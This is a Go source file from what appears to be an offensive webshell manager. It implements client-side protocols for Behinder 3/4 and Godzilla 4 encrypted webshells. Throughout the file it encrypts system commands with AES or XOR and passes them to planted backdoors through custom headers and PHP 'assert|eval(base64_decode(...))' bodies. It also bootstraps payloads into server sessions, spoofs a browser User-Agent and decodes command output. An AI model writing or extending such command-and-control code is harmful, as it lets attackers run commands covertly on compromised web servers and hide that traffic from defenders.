package webshell

// 第三方加密马（冰蝎 3/4、哥斯拉 4）的适配层。
//
// 和 ARTEX 原生协议的区别只有「请求怎么加密、响应怎么解」这一层：命令仍然是一条
// 要由目标 shell 执行的系统命令，文件管理仍然复用 fs.go 里的 sh / PowerShell 脚本。
// 各家的 payload 约定不同（冰蝎 JSP/ASPX 每请求重新加载、哥斯拉 4 首次请求把
// payload 缓存在会话里），所以这里维护一个按「URL + 协议 + 密钥」复用的会话。
//
// 具体线格式来自官方客户端的实际请求：
//   - 冰蝎 4 用 data.db 里的 TransProtocol：AES-128-ECB / XOR / 带 magic 尾巴；
//   - 冰蝎 3 固定为 AES-128-ECB（PHP/JSP）、AES-128-CBC（ASPX）、XOR（ASP；
//     本包只覆盖 PHP/JSP/ASPX）；
//   - 哥斯拉 4 请求体是 pass=base64(加密后的序列化参数)，响应带 md5 边界标记。
//
// 命令放在自定义请求头 X-Artex-Cmd（base64）里，边界在 X-Artex-Mark。这样同一份
// 我们自己编译的 PHP/JSP/C# payload 可以同时服务冰蝎与哥斯拉，不必按对方的
// payload 参数格式做字节级改写。

import (
	"bytes"
	"context"
	"crypto/md5"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// 第三方协议家族。
const (
	FamilyBehinder3 = "behinder3"
	FamilyBehinder4 = "behinder4"
	FamilyGodzilla4 = "godzilla4"
)

// 加密器名称（webshells.crypto）。
const (
	CryptoBehinderAES      = "default_aes"
	CryptoBehinderAESMagic = "aes_with_magic"
	CryptoBehinderXOR      = "default_xor"
	CryptoBehinderXORB64   = "default_xor_base64"

	CryptoGodzillaXORB64 = "xor_base64"
	CryptoGodzillaAESB64 = "aes_base64"
)

const (
	// 加密马把命令放在请求头里；Web 容器对请求头的常见上限是 8KB。
	maxXHeaderCommandBytes = 6000
	// 会话缓存的空闲上限：超过后下次访问重建（目标端的 session 也会过期）。
	xSessionIdle = 30 * time.Minute
	xSessionMax  = 256
)

var (
	ErrXProtocol      = errors.New("第三方加密马协议参数不完整")
	ErrXPayloadTooBig = errors.New("命令过长：加密马通过请求头传命令，单条约 6KB；请改用原生马或缩短命令")
	ErrXCrypto        = errors.New("加密马响应解密失败（密码/密钥或加密方式不对）")
	ErrXBadResponse   = errors.New("加密马响应里没有 ARTEX 边界标记（payload 未执行或被拦截）")
)

func familyLanguage(shellType string) (family, lang string, ok bool) {
	switch shellType {
	case TypeBehinder3PHP:
		return FamilyBehinder3, "php", true
	case TypeBehinder3JSP:
		return FamilyBehinder3, "jsp", true
	case TypeBehinder3ASPX:
		return FamilyBehinder3, "aspx", true
	case TypeBehinder4PHP:
		return FamilyBehinder4, "php", true
	case TypeBehinder4JSP:
		return FamilyBehinder4, "jsp", true
	case TypeBehinder4ASPX:
		return FamilyBehinder4, "aspx", true
	case TypeGodzilla4PHP:
		return FamilyGodzilla4, "php", true
	case TypeGodzilla4JSP:
		return FamilyGodzilla4, "jsp", true
	case TypeGodzilla4ASPX:
		return FamilyGodzilla4, "aspx", true
	}
	return "", "", false
}

// IsEncryptedType reports whether shellType encrypts its traffic — either one of the
// third-party protocols or ARTEX's own envelope.
func IsEncryptedType(shellType string) bool {
	if IsArtexCryptType(shellType) {
		return true
	}
	_, _, ok := familyLanguage(shellType)
	return ok
}

// IsThirdPartyType reports whether shellType uses a Behinder/Godzilla wire format.
func IsThirdPartyType(shellType string) bool {
	_, _, ok := familyLanguage(shellType)
	return ok
}

func (t *Target) familyLanguage() (string, string, bool) {
	return familyLanguage(t.Type)
}

func (t *Target) secret() string {
	if strings.TrimSpace(t.Secret) != "" {
		return strings.TrimSpace(t.Secret)
	}
	if d, ok := descriptorOf(t.Type); ok && d.DefaultSecret != "" {
		return d.DefaultSecret
	}
	if f, _, _ := t.familyLanguage(); f == FamilyGodzilla4 {
		return "pass"
	}
	return "rebeyond"
}

func (t *Target) secretKey() string {
	if strings.TrimSpace(t.SecretKey) != "" {
		return strings.TrimSpace(t.SecretKey)
	}
	if d, ok := descriptorOf(t.Type); ok && d.DefaultSecretKey != "" {
		return d.DefaultSecretKey
	}
	return "key"
}

// cryptoName 返回该类型实际使用的加密器；空值与非法值回落到默认。
func (t *Target) cryptoName() string {
	if d, ok := descriptorOf(t.Type); ok {
		if t.Crypto != "" && d.HasCrypto(t.Crypto) {
			return t.Crypto
		}
		return d.DefaultCrypto
	}
	return t.Crypto
}

// key16 是冰蝎/哥斯拉共用的密钥派生：md5(口令) 的十六进制前 16 位。
// 冰蝎把它直接当 AES 密钥；哥斯拉把「密钥」字段再 md5 一次取前 16 位。
func key16(secret string) string {
	sum := md5.Sum([]byte(secret))
	return hex.EncodeToString(sum[:])[:16]
}

func md5Hex(s string) string {
	sum := md5.Sum([]byte(s))
	return hex.EncodeToString(sum[:])
}

// md5HexNoLeadingZero 复刻哥斯拉 JSP 壳里 BigInteger.toString(16) 的行为：
// 前导零会被吃掉。标记必须与壳自己算的一致，否则切不出来。
func md5HexNoLeadingZero(s string) string {
	h := strings.TrimLeft(md5Hex(s), "0")
	if h == "" {
		h = "0"
	}
	return strings.ToUpper(h)
}

// bern 生成一对随机十六进制边界；与原生协议同形，便于日志里一眼辨认。
func artMarkers() (begin, end string, err error) {
	return marker()
}

// xSession 是一次加密马会话：cookie jar 负责哥斯拉的会话 payload，bootstrapped
// 记录首次 payload 是否已经发过。请求在锁内串行，避免并发重复引导。
type xSession struct {
	mu           sync.Mutex
	client       *http.Client
	bootstrapped bool
	lastUsed     time.Time
}

type xSessionEntry struct {
	key  string
	sess *xSession
}

var xSessions = struct {
	sync.Mutex
	m map[string]*xSessionEntry
}{m: map[string]*xSessionEntry{}}

func xSessionKey(t *Target) string {
	family, lang, _ := t.familyLanguage()
	return family + "|" + lang + "|" + t.Type + "|" + t.cryptoName() + "|" + t.URL +
		"|" + md5Hex(t.secret()) + "|" + md5Hex(t.secretKey()) + "|" + fmt.Sprint(t.InsecureTLS)
}

func getXSession(t *Target, insecure bool) *xSession {
	key := xSessionKey(t)
	now := time.Now()
	xSessions.Lock()
	defer xSessions.Unlock()
	if e, ok := xSessions.m[key]; ok {
		if now.Sub(e.sess.lastUsed) < xSessionIdle {
			e.sess.lastUsed = now
			return e.sess
		}
		delete(xSessions.m, key)
	}
	// 简单淘汰：先清过期，再清最旧的一半，避免长期运行后无限增长。
	if len(xSessions.m) >= xSessionMax {
		for k, e := range xSessions.m {
			if now.Sub(e.sess.lastUsed) >= xSessionIdle {
				delete(xSessions.m, k)
			}
		}
		if len(xSessions.m) >= xSessionMax {
			for k := range xSessions.m {
				delete(xSessions.m, k)
				if len(xSessions.m) < xSessionMax/2 {
					break
				}
			}
		}
	}
	s := &xSession{client: newXHTTPClient(insecure), lastUsed: now}
	xSessions.m[key] = &xSessionEntry{key: key, sess: s}
	return s
}

// resetXSession 丢弃某条记录的会话状态；目标端 session 过期后下一次命令会重新引导。
func resetXSession(t *Target) {
	key := xSessionKey(t)
	xSessions.Lock()
	delete(xSessions.m, key)
	xSessions.Unlock()
}

func newXHTTPClient(insecure bool) *http.Client {
	return NewHTTPClient(insecure, true)
}

// Exec 执行一条系统命令，返回与原生协议一致的 Outcome。
func Exec(ctx context.Context, t *Target, input string, timeout time.Duration) (*Outcome, error) {
	return ExecMode(ctx, t, ModeCommand, input, timeout)
}

// ExecMode 与 Exec 相同，但允许原生 PHP 马切到代码执行模式；加密马只执行系统命令。
func ExecMode(ctx context.Context, t *Target, mode, input string, timeout time.Duration) (*Outcome, error) {
	if strings.TrimSpace(input) == "" {
		return nil, ErrEmptyInput
	}
	if IsArtexCryptType(t.Type) {
		if mode == ModeCode {
			return nil, ErrModeNotSupported
		}
		if timeout <= 0 {
			timeout = DefaultTimeout
		}
		return execArtexCrypt(ctx, t, input, timeout)
	}
	if !IsEncryptedType(t.Type) {
		p, err := Build(t, mode, input)
		if err != nil {
			return nil, err
		}
		return Run(ctx, t, p, timeout)
	}
	if mode == ModeCode {
		return nil, ErrModeNotSupported
	}
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	return execEncrypted(ctx, t, input, timeout)
}

// ExecScript 与 Exec 相同，但只关心成功时的输出；文件管理用它。
func ExecScript(ctx context.Context, t *Target, script string, timeout time.Duration) (string, error) {
	out, err := Exec(ctx, t, script, timeout)
	if err != nil {
		return "", err
	}
	if !out.Parsed {
		return "", ErrFSBadScript
	}
	return out.Output, nil
}

func execEncrypted(ctx context.Context, t *Target, input string, timeout time.Duration) (*Outcome, error) {
	begin, end, err := artMarkers()
	if err != nil {
		return nil, err
	}
	cmd64 := base64.StdEncoding.EncodeToString([]byte(input))
	if len(cmd64) > maxXHeaderCommandBytes {
		return nil, ErrXPayloadTooBig
	}
	headers := map[string]string{
		"X-Artex-Cmd":  cmd64,
		"X-Artex-Mark": begin + "|" + end,
	}
	family, lang, _ := t.familyLanguage()
	sess := getXSession(t, t.InsecureTLS)
	sess.mu.Lock()
	defer sess.mu.Unlock()
	sess.lastUsed = time.Now()

	if family == FamilyGodzilla4 {
		if !sess.bootstrapped {
			if err := godzillaBootstrap(ctx, sess, t, lang, timeout); err != nil {
				return nil, err
			}
			sess.bootstrapped = true
		}
		out, err := godzillaExec(ctx, sess, t, lang, headers, timeout)
		if err == nil && out.Parsed {
			return out, nil
		}
		// 目标端 session 过期，或上一次引导的 payload 不能用：换一个新 Cookie 会话，
		// 让目标端重新落一份 payload，再试一次。
		sess.client = newXHTTPClient(t.InsecureTLS)
		sess.bootstrapped = false
		if berr := godzillaBootstrap(ctx, sess, t, lang, timeout); berr != nil {
			return nil, berr
		}
		sess.bootstrapped = true
		out2, err2 := godzillaExec(ctx, sess, t, lang, headers, timeout)
		if err2 != nil {
			return nil, err2
		}
		if out2.Raw == "" && out != nil {
			out2.Raw = out.Raw
		}
		return out2, nil
	}

	out, err := behinderExec(ctx, sess, t, lang, headers, timeout)
	if err != nil {
		return nil, err
	}
	return out, nil
}

// xDo 统一发一次请求：带超时的 context、浏览器 UA、响应体上限。
func xDo(ctx context.Context, sess *xSession, method, rawURL, contentType string,
	body []byte, headers map[string]string, timeout time.Duration) (int, []byte, time.Duration, error) {
	reqCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	var rd io.Reader
	if body != nil {
		rd = bytes.NewReader(body)
	}
	req, err := http.NewRequestWithContext(reqCtx, method, rawURL, rd)
	if err != nil {
		return 0, nil, 0, err
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	start := time.Now()
	resp, err := sess.client.Do(req)
	if err != nil {
		return 0, nil, time.Since(start), err
	}
	defer resp.Body.Close()
	data, readErr := io.ReadAll(io.LimitReader(resp.Body, maxOutputBytes))
	if readErr != nil {
		return resp.StatusCode, nil, time.Since(start), fmt.Errorf("读取响应失败: %w", readErr)
	}
	return resp.StatusCode, data, time.Since(start), nil
}

func splitMarked(body, begin, end string) (string, bool) {
	i := strings.Index(body, begin)
	if i < 0 {
		return body, false
	}
	rest := body[i+len(begin):]
	j := strings.Index(rest, end)
	if j < 0 {
		return body, false
	}
	return strings.TrimSpace(rest[:j]), true
}

// ---- 冰蝎 ----

func behinderExec(ctx context.Context, sess *xSession, t *Target, lang string,
	headers map[string]string, timeout time.Duration) (*Outcome, error) {
	payload := behinderPayload(lang)
	if len(payload) == 0 {
		return nil, ErrXProtocol
	}
	key := key16(t.secret())
	body, err := behinderEncrypt(t, lang, key, payload)
	if err != nil {
		return nil, err
	}
	ctype := "application/octet-stream"
	if lang == "php" {
		// 冰蝎客户端对 PHP 用表单编码；马本身读 php://input，类型不影响解密。
		ctype = "application/x-www-form-urlencoded"
	}
	status, data, elapsed, err := xDo(ctx, sess, "POST", t.URL, ctype, body, headers, timeout)
	if err != nil {
		return nil, err
	}
	out := &Outcome{Status: status, Elapsed: elapsed, Raw: string(data)}
	marks := headers["X-Artex-Mark"]
	if i := strings.IndexByte(marks, '|'); i >= 0 {
		out.Output, out.Parsed = splitMarked(out.Raw, marks[:i], marks[i+1:])
	}
	return out, nil
}

func behinderPayload(lang string) []byte {
	switch lang {
	case "php":
		return []byte(phpPayloadBehinder)
	case "jsp":
		return jspPayloadBytes
	case "aspx":
		return aspxPayloadBytes
	}
	return nil
}

func behinderEncrypt(t *Target, lang, key string, payload []byte) ([]byte, error) {
	family, _, _ := t.familyLanguage()
	if family == FamilyBehinder3 {
		switch lang {
		case "php":
			inner := "assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(payload) + "'));"
			// 冰蝎 3 的 PHP 通道是 AES-128-CBC + 全零 IV（不是 JSP 的 ECB）。
			enc, err := aesCBCEncrypt([]byte(key), make([]byte, 16), []byte(inner))
			if err != nil {
				return nil, err
			}
			return []byte(base64.StdEncoding.EncodeToString(enc)), nil
		case "jsp":
			enc, err := aesECBEncrypt([]byte(key), payload)
			if err != nil {
				return nil, err
			}
			return []byte(base64.StdEncoding.EncodeToString(enc)), nil
		case "aspx":
			// ASPX 直接收原始密文字节（CBC，IV = 密钥）。
			return aesCBCEncrypt([]byte(key), []byte(key), payload)
		}
		return nil, ErrXProtocol
	}

	switch t.cryptoName() {
	case CryptoBehinderAESMagic:
		enc, err := aesECBEncrypt([]byte(key), payload)
		if err != nil {
			return nil, err
		}
		out := []byte(base64.StdEncoding.EncodeToString(enc))
		n := magicTailLen(key)
		if n > 0 {
			tail := make([]byte, n)
			if _, err := rand.Read(tail); err != nil {
				return nil, err
			}
			out = append(out, tail...)
		}
		return out, nil
	case CryptoBehinderXOR:
		return xorRing(payload, []byte(key), 1), nil
	case CryptoBehinderXORB64:
		return []byte(base64.StdEncoding.EncodeToString(xorRing(payload, []byte(key), 1))), nil
	default: // default_aes
		enc, err := aesECBEncrypt([]byte(key), payload)
		if err != nil {
			return nil, err
		}
		return []byte(base64.StdEncoding.EncodeToString(enc)), nil
	}
}

// magicTailLen 与冰蝎的 parseInt(key[:2],16)%16 一致。
func magicTailLen(key string) int {
	if len(key) < 2 {
		return 0
	}
	var v int
	if _, err := fmt.Sscanf(key[:2], "%x", &v); err != nil {
		return 0
	}
	return v % 16
}

// ---- 哥斯拉 ----

func godzillaPayload(lang string) []byte {
	switch lang {
	case "php":
		return []byte(phpPayloadGodzilla)
	case "jsp":
		return jspPayloadBytes
	case "aspx":
		return aspxPayloadBytes
	}
	return nil
}

func godzillaBootstrap(ctx context.Context, sess *xSession, t *Target, lang string, timeout time.Duration) error {
	payload := godzillaPayload(lang)
	if len(payload) == 0 {
		return ErrXProtocol
	}
	_, _, _, err := godzillaRequest(ctx, sess, t, lang, payload, nil, timeout)
	return err
}

func godzillaExec(ctx context.Context, sess *xSession, t *Target, lang string,
	headers map[string]string, timeout time.Duration) (*Outcome, error) {
	// 哥斯拉壳只把 body 当成「参数包」透传给 payload；我们的 payload 从请求头取
	// 命令，body 给一个非空占位即可（JSP 的 AES 也不接受空明文）。
	data := []byte("artex-command-01")
	if lang == "php" {
		data = []byte("artex")
	}
	status, body, elapsed, err := godzillaRequest(ctx, sess, t, lang, data, headers, timeout)
	if err != nil {
		return nil, err
	}
	out := &Outcome{Status: status, Elapsed: elapsed, Raw: string(body)}
	dec, ok := godzillaDecrypt(t, lang, body)
	if !ok {
		// 解密失败时保留原文，便于用户判断是密码错、被拦截还是 payload 没落地。
		return out, nil
	}
	out.Raw = string(dec)
	marks := headers["X-Artex-Mark"]
	i := strings.IndexByte(marks, '|')
	if i < 0 {
		return out, ErrXProtocol
	}
	out.Output, out.Parsed = splitMarked(out.Raw, marks[:i], marks[i+1:])
	return out, nil
}

func godzillaRequest(ctx context.Context, sess *xSession, t *Target, lang string,
	data []byte, headers map[string]string, timeout time.Duration) (int, []byte, time.Duration, error) {
	key := key16(t.secretKey())
	var enc []byte
	var err error
	switch lang {
	case "jsp":
		enc, err = aesECBEncrypt([]byte(key), data)
	case "aspx":
		enc, err = aesCBCEncrypt([]byte(key), []byte(key), data)
	default: // php
		enc = xorRing(data, []byte(key), 1)
	}
	if err != nil {
		return 0, nil, 0, err
	}
	form := url.Values{}
	form.Set(t.secret(), base64.StdEncoding.EncodeToString(enc))
	body := []byte(form.Encode())
	return xDo(ctx, sess, "POST", t.URL, "application/x-www-form-urlencoded", body, headers, timeout)
}

func godzillaDecrypt(t *Target, lang string, body []byte) ([]byte, bool) {
	pass := t.secret()
	key := key16(t.secretKey())
	var left, right string
	switch lang {
	case "php":
		h := md5Hex(pass + key)
		left, right = h[:16], h[16:]
	case "jsp":
		h := md5HexNoLeadingZero(pass + key)
		if len(h) < 17 {
			return nil, false
		}
		left, right = h[:16], h[16:]
	case "aspx":
		h := strings.ToUpper(md5Hex(pass + key))
		left, right = h[:16], h[16:]
	default:
		return nil, false
	}
	seg, ok := splitMarked(string(body), left, right)
	if !ok {
		return nil, false
	}
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(seg))
	if err != nil {
		return nil, false
	}
	switch lang {
	case "jsp":
		dec, err := aesECBDecrypt([]byte(key), raw)
		if err != nil {
			return nil, false
		}
		return dec, true
	case "aspx":
		dec, err := aesCBCDecrypt([]byte(key), []byte(key), raw)
		if err != nil {
			return nil, false
		}
		return dec, true
	default:
		return xorRing(raw, []byte(key), 1), true
	}
}

// Check 跑一次无害探测。第三方加密马同样走 Exec，能解出边界标记即判活——
// 标记每次随机生成，静态页面不可能命中。
func Check(ctx context.Context, t *Target, timeout time.Duration) (bool, string, error) {
	out, err := Exec(ctx, t, ProbeCommand, timeout)
	if err != nil {
		return false, "", err
	}
	if !out.Parsed {
		return false, fmt.Sprintf("HTTP %d，响应中缺少标记，可能不是本工具生成的马或被拦截", out.Status), nil
	}
	return true, out.Output, nil
}
